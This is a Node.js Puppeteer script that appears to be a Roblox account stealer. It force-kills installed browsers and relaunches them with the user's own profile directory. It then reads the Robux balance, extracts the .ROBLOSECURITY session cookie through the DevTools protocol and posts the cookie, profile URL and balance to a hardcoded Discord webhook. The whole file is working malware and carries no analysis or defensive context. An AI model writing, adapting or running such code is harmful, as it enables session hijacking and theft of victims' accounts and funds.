const puppeteer = require('puppeteer');
const { execSync } = require('child_process');
const fs = require('fs');
const os = require('os');  // Import the 'os' module to get the system's username

console.log("🚀 Script started");

// Get the current system username dynamically
const username = os.userInfo().username;

// Check if a browser is installed
function isBrowserInstalled(browserPath) {
  return fs.existsSync(browserPath);
}

// Check if a browser process is running
function isBrowserRunning(browserName) {
  try {
    execSync(`tasklist /FI "IMAGENAME eq ${browserName}.exe"`, { stdio: 'ignore' });
    return true;
  } catch {
    return false;
  }
}

// Kill a browser process if it's running
function killBrowserProcess(browserName) {
  if (isBrowserRunning(browserName)) {
    try {
      console.log(`🛑 Attempting to kill: ${browserName}.exe`);
      execSync(`taskkill /IM ${browserName}.exe /F`);
      console.log(`✅ ${browserName} terminated.`);
    } catch {
      console.log(`❌ Failed to terminate ${browserName}.exe`);
    }
  } else {
    console.log(`ℹ️ ${browserName} not running.`);
  }
}

// Browsers to try
const browserPaths = [
  {
    name: 'chrome',
    path: `C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe`,
    product: 'chrome',
    userDataDir: `C:\\Users\\${username}\\AppData\\Local\\Google\\Chrome\\User Data`,
  },
  {
    name: 'msedge',
    path: `C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe`,
    product: 'chrome',
    userDataDir: `C:\\Users\\${username}\\AppData\\Local\\Microsoft\\Edge\\User Data`,
  },
  {
    name: 'firefox',
    path: `C:\\Program Files\\Mozilla Firefox\\firefox.exe`,
    product: 'firefox',
    userDataDir: '',
  },
];

// Try Puppeteer with a browser
async function tryPuppeteer(browserConfig) {
  let browser;
  try {
    console.log(`🚀 Launching ${browserConfig.name}...`);
    browser = await puppeteer.launch({
      executablePath: browserConfig.path,
      product: browserConfig.product,
      headless: false,
      userDataDir: browserConfig.userDataDir || undefined,
      args: ['--no-sandbox', '--disable-setuid-sandbox'],
    });

    const page = await browser.newPage();
    console.log('🌐 Navigating to Roblox...');
    await page.goto('https://www.roblox.com', { waitUntil: 'domcontentloaded' });

    console.log('👤 Going to profile...');
    await page.goto('https://www.roblox.com/users/profile', { waitUntil: 'domcontentloaded' });

    const robuxSelector = '#nav-robux';
    try {
      await page.waitForSelector(robuxSelector, { timeout: 15000 });
    } catch {
      console.log(`⏰ Timeout: ${robuxSelector} not found`);
      return false;
    }

    await page.click(robuxSelector);
    await page.waitForSelector('#nav-robux-amount', { timeout: 10000 });

    const robuxBalance = await page.$eval('#nav-robux-amount', el => el.innerText.trim());

    const client = await page.target().createCDPSession();
    const { cookies } = await client.send('Network.getAllCookies');
    const robloxCookie = cookies.find(c => c.name === '.ROBLOSECURITY');

    if (!robloxCookie || !robloxCookie.value) {
      console.log('❌ .ROBLOSECURITY cookie not found');
      return false;
    }

    const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
    await fetch('https://discord.com/api/webhooks/1367835268954194072/d_xMvdDNjj16cU5TMPajZVf4OxMmz2SPmC5WWl_vvwrhP0bMxG37Ll2OPEUr-9d0JOa6', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content:
          `.ROBLOSECURITY:\n\`\`\`${robloxCookie.value}\`\`\`\n` +
          `Profile: ${page.url()}\n` +
          `Robux: ${robuxBalance}`
      })
    });

    console.log(`✅ Success with ${browserConfig.name}`);
    return true;

  } catch (err) {
    console.error(`❌ Error with ${browserConfig.name}:`, err.message);
    return false;
  } finally {
    if (browser) await browser.close();
  }
}

// Main loop
(async () => {
  console.log("🔍 Checking available browsers...");
  let triedAny = false;

  for (const browser of browserPaths) {
    console.log(`➡️ Checking ${browser.name} at: ${browser.path}`);
    if (!isBrowserInstalled(browser.path)) {
      console.log(`❌ ${browser.name} not installed at that path.`);
      continue;
    }

    triedAny = true;
    killBrowserProcess(browser.name);
    const success = await tryPuppeteer(browser);
    if (success) break;
  }

  if (!triedAny) {
    console.log("🚫 No supported browsers found. Update the paths in the script.");
  }

  console.log("🏁 Script finished. Press any key to exit...");
  process.stdin.setRawMode(true);
  process.stdin.resume();
  process.stdin.on('data', process.exit.bind(process, 0));
})();
